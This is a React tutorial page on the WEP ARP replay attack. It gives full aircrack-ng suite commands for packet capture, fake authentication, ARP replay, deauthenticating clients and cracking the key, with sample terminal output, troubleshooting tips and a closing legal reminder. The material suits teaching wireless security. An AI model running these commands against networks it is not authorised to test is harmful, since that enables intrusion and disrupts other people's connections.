import React from 'react';
import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';

const ARPReplay = () => {
  return (
    <div className="page-content">
      <h1>ARP Replay Attack — Generating Traffic at Will</h1>

      <p>
        The <strong>ARP Replay Attack</strong> is the single most important technique for cracking WEP 
        quickly. Here's the problem: to crack WEP, you need tens of thousands of IVs (Initialization 
        Vectors). On a quiet network, collecting enough IVs naturally could take <em>hours or even days</em>. 
        ARP replay solves this by capturing one ARP packet and replaying it over and over, forcing the 
        router to respond with new encrypted packets — each containing a fresh IV.
      </p>

      <img 
        src="https://upload.wikimedia.org/wikipedia/commons/3/33/ARP_Spoofing.svg" 
        alt="ARP Protocol Diagram" 
        style={{ maxWidth: '100%', borderRadius: 8, margin: '16px 0' }} 
      />

      {/* ============================================================ */}
      {/* SECTION: Understanding ARP                                    */}
      {/* ============================================================ */}
      <h2>📖 Understanding ARP (Address Resolution Protocol)</h2>

      <p>
        Before we dive into the attack, let's understand what ARP is. When a device on a network 
        wants to communicate with another device, it knows the <strong>IP address</strong> but needs 
        the <strong>MAC address</strong>. ARP bridges this gap:
      </p>

      <Diagram title="How ARP Works">
{`
  Normal ARP Process:
  
  Laptop (192.168.1.5)                              Router (192.168.1.1)
      │                                                  │
      │── ARP Request (Broadcast) ─────────────────────►│
      │   "Who has 192.168.1.1? Tell 192.168.1.5"       │
      │                                                  │
      │◄── ARP Reply (Unicast) ─────────────────────────│
      │    "192.168.1.1 is at AA:BB:CC:DD:EE:FF"        │
      │                                                  │
  
  Key Properties of ARP:
  ┌──────────────────────────────────────────────────────────────┐
  │ • ARP requests are BROADCAST — everyone on the LAN hears    │
  │ • ARP replies are UNICAST — sent directly to the requester  │
  │ • ARP is a Layer 2 protocol (works with MAC addresses)      │
  │ • ARP packets are small and predictable in structure        │
  │ • The router ALWAYS responds to valid ARP requests          │
  │ • Each response is encrypted with a NEW IV in WEP!          │
  └──────────────────────────────────────────────────────────────┘
`}
      </Diagram>

      <InfoBox type="note">
        <strong>Why ARP specifically?</strong> ARP packets are ideal for replay attacks because:
        <br />1. They're small (fixed size), so we can identify them even when encrypted
        <br />2. The router is <em>required</em> to respond to every ARP request
        <br />3. Each response generates a new IV — exactly what we need for cracking
        <br />4. ARP requests have a known, predictable structure
      </InfoBox>

      {/* ============================================================ */}
      {/* SECTION: How the Attack Works                                 */}
      {/* ============================================================ */}
      <h2>🔧 How ARP Replay Works</h2>

      <Diagram title="ARP Replay Attack Flow">
{`
  ┌─────────────────────────────────────────────────────────────────────────┐
  │                        ARP REPLAY ATTACK FLOW                          │
  └─────────────────────────────────────────────────────────────────────────┘
  
  Step 1: Capture an ARP Packet
  ═══════════════════════════════
  Real Client ───ARP Request───► Router ───ARP Reply───► Real Client
       │                                                     
       └── We CAPTURE this ARP request (even though encrypted,
           we can identify it by its size: 68 bytes)
  
  Step 2: Replay the Captured ARP
  ═══════════════════════════════
  ┌─────────────────────────────────────────────────────────────────────┐
  │                                                                     │
  │  Our Adapter ──Replay ARP #1──► Router ──Reply (IV #1001)──► Us    │
  │  Our Adapter ──Replay ARP #2──► Router ──Reply (IV #1002)──► Us    │
  │  Our Adapter ──Replay ARP #3──► Router ──Reply (IV #1003)──► Us    │
  │  Our Adapter ──Replay ARP #4──► Router ──Reply (IV #1004)──► Us    │
  │  ...                                                                │
  │  Our Adapter ──Replay ARP #N──► Router ──Reply (IV #N+1000)──► Us  │
  │                                                                     │
  │  Each reply uses a DIFFERENT IV!                                     │
  │  At ~800 packets/sec, we get ~50,000 IVs per minute!               │
  │                                                                     │
  └─────────────────────────────────────────────────────────────────────┘
  
  Step 3: Airodump-ng Captures All IVs
  ═══════════════════════════════════════
  Meanwhile, airodump-ng in another terminal is saving
  everything to a .cap file. Once we have enough IVs
  (20,000-40,000+), we can crack the key with aircrack-ng!
`}
      </Diagram>

      {/* ============================================================ */}
      {/* SECTION: Step by Step                                         */}
      {/* ============================================================ */}
      <h2>🖥️ Complete Attack Walkthrough</h2>

      <p>
        You need <strong>three terminals</strong> running simultaneously for this attack. Let's set 
        them up one by one:
      </p>

      <h3>Terminal 1 — Capture IVs with Airodump-ng</h3>
      <Terminal lines={[
        { segments: [{ text: '# Start capturing packets on the target channel', type: 'comment' }] },
        { segments: [{ text: '# --bssid = target router | --channel = router\'s channel', type: 'comment' }] },
        { segments: [{ text: '# --write = output file prefix', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airodump-ng --bssid 44:55:66:DD:EE:FF --channel 6 --write wep_capture wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' CH  6 ][ Elapsed: 0 s ][ 2024-01-15 15:15', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' BSSID              PWR  Beacons  #Data  #/s  CH  ENC   AUTH  ESSID', type: 'output' }] },
        { segments: [{ text: ' 44:55:66:DD:EE:FF  -45  120      15     2    6   WEP   OPN   TestNetwork', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Watch the #Data column — this is your IV count!', type: 'comment' }] },
        { segments: [{ text: '# It will start growing rapidly once ARP replay begins', type: 'comment' }] },
      ]} />

      <h3>Terminal 2 — Fake Authentication</h3>
      <Terminal lines={[
        { segments: [{ text: '# Associate with the AP first (required for injection)', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --fakeauth 6000 -a 44:55:66:DD:EE:FF -h 00:c0:ca:aa:bb:cc -q 10 wlan0mon', type: 'command' }] },
        { segments: [{ text: '15:15:30  Sending Authentication Request (Open System) [ACK]', type: 'output' }] },
        { segments: [{ text: '15:15:30  Authentication successful', type: 'highlight' }] },
        { segments: [{ text: '15:15:30  Sending Association Request [ACK]', type: 'output' }] },
        { segments: [{ text: '15:15:30  Association successful :-) (AID: 1)', type: 'highlight' }] },
      ]} />

      <h3>Terminal 3 — ARP Replay Attack</h3>
      <Terminal lines={[
        { segments: [{ text: '# Launch the ARP replay attack', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --arpreplay -b 44:55:66:DD:EE:FF -h 00:c0:ca:aa:bb:cc wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: 'Saving ARP requests in replay_arp-0115-151545.cap', type: 'output' }] },
        { segments: [{ text: 'You should also start airodump-ng to capture replies.', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Waiting for an ARP packet...', type: 'comment' }] },
        { segments: [{ text: 'Read 1842 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)', type: 'output' }] },
        { segments: [{ text: 'Read 2156 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# ★ An ARP packet is captured! Replay begins!', type: 'comment' }] },
        { segments: [{ text: 'Read 3521 packets (got 1 ARP requests and 423 ACKs), sent 423 packets...(812 pps)', type: 'highlight' }] },
        { segments: [{ text: 'Read 4296 packets (got 1 ARP requests and 1247 ACKs), sent 1247 packets...(824 pps)', type: 'highlight' }] },
        { segments: [{ text: 'Read 5103 packets (got 1 ARP requests and 2071 ACKs), sent 2071 packets...(819 pps)', type: 'highlight' }] },
      ]} />

      <InfoBox type="success">
        <strong>It's working!</strong> When you see the "sent" count rapidly increasing (500-1000+ pps), 
        switch to your airodump-ng terminal. The <code>#Data</code> column should be climbing fast — 
        hundreds or thousands per second. You'll have enough IVs to crack WEP in minutes!
      </InfoBox>

      <h3>The Waiting Problem — No ARP Packets?</h3>
      <Terminal lines={[
        { segments: [{ text: '# If no one is using the network, you won\'t see any ARP packets.', type: 'comment' }] },
        { segments: [{ text: '# aireplay-ng will sit here forever:', type: 'comment' }] },
        { segments: [{ text: 'Read 15842 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Solutions to generate an ARP packet:', type: 'comment' }] },
        { segments: [{ text: '# 1. Deauthenticate a connected client → when they reconnect,', type: 'comment' }] },
        { segments: [{ text: '#    their device sends ARP packets to re-establish connections', type: 'comment' }] },
        { segments: [{ text: '# 2. Wait for someone to connect to the network', type: 'comment' }] },
        { segments: [{ text: '# 3. Use an interactive attack (-p 0841) as an alternative', type: 'comment' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Deauth a client to generate ARP traffic:', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --deauth 5 -a 44:55:66:DD:EE:FF -c AA:BB:CC:11:22:33 wlan0mon', type: 'command' }] },
        { segments: [{ text: '# Send 5 deauth frames to the client → they reconnect → ARP generated!', type: 'comment' }] },
      ]} />

      {/* ============================================================ */}
      {/* SECTION: Cracking the Key                                     */}
      {/* ============================================================ */}
      <h2>🔓 Cracking with Aircrack-ng</h2>

      <Terminal lines={[
        { segments: [{ text: '# Once you have enough IVs (check #Data in airodump-ng):', type: 'comment' }] },
        { segments: [{ text: '# • 64-bit WEP: ~20,000 IVs usually enough', type: 'comment' }] },
        { segments: [{ text: '# • 128-bit WEP: ~40,000-85,000 IVs recommended', type: 'comment' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# You can run aircrack-ng while still collecting:', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aircrack-ng wep_capture-01.cap', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '                                 Aircrack-ng 1.7', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '      [00:00:03] Tested 892541 keys (got 52341 IVs)', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '   KB    depth   byte(vote)', type: 'output' }] },
        { segments: [{ text: '    0    0/ 13   AB(  215) 3D(  190) 7F(  178)', type: 'output' }] },
        { segments: [{ text: '    1    0/  3   CD(  230) 12(  195) 89(  180)', type: 'output' }] },
        { segments: [{ text: '    ...', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '          KEY FOUND! [ AB:CD:EF:12:34 ]', type: 'highlight' }] },
        { segments: [{ text: '   Decrypted correctly: 100%', type: 'highlight' }] },
      ]} />

      <InfoBox type="tip">
        <strong>Pro tip:</strong> You can run aircrack-ng <em>while</em> airodump-ng and aireplay-ng 
        are still running. If it doesn't find the key yet (not enough IVs), it will automatically 
        retry every 5,000 IVs. Just leave everything running!
      </InfoBox>

      {/* ============================================================ */}
      {/* SECTION: Edge Cases                                           */}
      {/* ============================================================ */}
      <h2>⚠️ Edge Cases & Troubleshooting</h2>

      <h3>Edge Case: "got 0 ARP requests" for a long time</h3>
      <p>
        If no client is connected to the network, there will be no ARP traffic. Solutions:
      </p>
      <ul>
        <li>Wait for someone to connect</li>
        <li>Deauth an existing client to force ARP on reconnection</li>
        <li>Use the <strong>chopchop</strong> or <strong>fragmentation</strong> attack to craft your own ARP packet</li>
      </ul>

      <h3>Edge Case: High "sent" but #Data not increasing</h3>
      <Terminal lines={[
        { segments: [{ text: '# If you see high pps but #Data stays flat:', type: 'comment' }] },
        { segments: [{ text: 'Read 50000 packets (got 1 ARP requests and 45000 ACKs), sent 45000 packets...(800 pps)', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# But airodump-ng shows:', type: 'comment' }] },
        { segments: [{ text: ' #Data: 47    (still low!)', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Possible causes:', type: 'comment' }] },
        { segments: [{ text: '# 1. Airodump-ng is on the WRONG CHANNEL', type: 'comment' }] },
        { segments: [{ text: '#    → Make sure --channel matches the AP\'s channel', type: 'comment' }] },
        { segments: [{ text: '# 2. Your fake auth dropped — re-authenticate', type: 'comment' }] },
        { segments: [{ text: '# 3. The AP is filtering your injected packets', type: 'comment' }] },
        { segments: [{ text: '#    → Try spoofing your MAC to a legitimate client\'s MAC', type: 'comment' }] },
      ]} />

      <h3>Edge Case: "AP rejects" or injection not working</h3>
      <ul>
        <li><strong>Check injection capability:</strong> Run <code>sudo aireplay-ng --test -a BSSID wlan0mon</code> to test if injection works</li>
        <li><strong>Driver issue:</strong> Not all adapters support injection. Use an Alfa AWUS036ACH or similar</li>
        <li><strong>Distance:</strong> If you're too far from the AP, injected frames may not reach it reliably</li>
      </ul>

      <h3>Edge Case: aircrack-ng says "not enough IVs"</h3>
      <Terminal lines={[
        { segments: [{ text: '# If aircrack-ng fails:', type: 'comment' }] },
        { segments: [{ text: 'Failed. Next try with 50000 IVs.', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Don\'t worry! Just keep the replay running.', type: 'comment' }] },
        { segments: [{ text: '# aircrack-ng will automatically retry when more IVs arrive.', type: 'comment' }] },
        { segments: [{ text: '# For 128-bit WEP, you may need 80,000+ IVs.', type: 'comment' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# You can also try with the PTW attack method:', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aircrack-ng -z wep_capture-01.cap', type: 'command' }] },
        { segments: [{ text: '# -z uses the PTW attack (needs fewer IVs, ~20,000 for 128-bit)', type: 'comment' }] },
      ]} />

      {/* ============================================================ */}
      {/* SECTION: Complete Workflow Summary                            */}
      {/* ============================================================ */}
      <h2>📋 Complete Attack Summary</h2>

      <Diagram title="Full WEP Cracking Workflow with ARP Replay">
{`
  ┌──────────────────────────────────────────────────────────────────┐
  │              COMPLETE WEP CRACKING WORKFLOW                     │
  ├──────────────────────────────────────────────────────────────────┤
  │                                                                  │
  │  1. Start Monitor Mode                                          │
  │     └─ airmon-ng start wlan0                                    │
  │                                                                  │
  │  2. Discover Target                                             │
  │     └─ airodump-ng wlan0mon                                     │
  │        Note: BSSID, Channel, ESSID                              │
  │                                                                  │
  │  3. [Terminal 1] Capture Packets                                │
  │     └─ airodump-ng --bssid TARGET --channel CH                  │
  │        --write output wlan0mon                                   │
  │                                                                  │
  │  4. [Terminal 2] Fake Authentication                            │
  │     └─ aireplay-ng --fakeauth 6000 -a TARGET                   │
  │        -h YOUR_MAC -q 10 wlan0mon                               │
  │                                                                  │
  │  5. [Terminal 3] ARP Replay                                     │
  │     └─ aireplay-ng --arpreplay -b TARGET                        │
  │        -h YOUR_MAC wlan0mon                                      │
  │                                                                  │
  │  6. (Optional) Deauth a Client to Generate ARP                  │
  │     └─ aireplay-ng --deauth 5 -a TARGET                         │
  │        -c CLIENT_MAC wlan0mon                                    │
  │                                                                  │
  │  7. [Terminal 4] Crack the Key                                  │
  │     └─ aircrack-ng output-01.cap                                │
  │        Wait for "KEY FOUND!"                                     │
  │                                                                  │
  │  Timeline: ~5-15 minutes for most WEP networks                  │
  └──────────────────────────────────────────────────────────────────┘
`}
      </Diagram>

      <InfoBox type="warning">
        <strong>Legal Reminder:</strong> Only perform these attacks on networks you own or have 
        explicit written permission to test. Unauthorized access to computer networks is illegal 
        in virtually all jurisdictions and can result in severe criminal penalties.
      </InfoBox>

      <InfoBox type="success">
        <strong>Key Takeaways:</strong>
        <ul>
          <li>ARP replay captures an ARP packet and replays it to generate new IVs rapidly</li>
          <li>You need fake authentication before injection will work</li>
          <li>Run airodump-ng, fake auth, and ARP replay in separate terminals simultaneously</li>
          <li>If no ARP packets appear, deauth a connected client to trigger ARP traffic</li>
          <li>aircrack-ng can run concurrently and will auto-retry as more IVs arrive</li>
          <li>WEP can typically be cracked in 5-15 minutes with this method</li>
        </ul>
      </InfoBox>
    </div>
  );
};

export default ARPReplay;
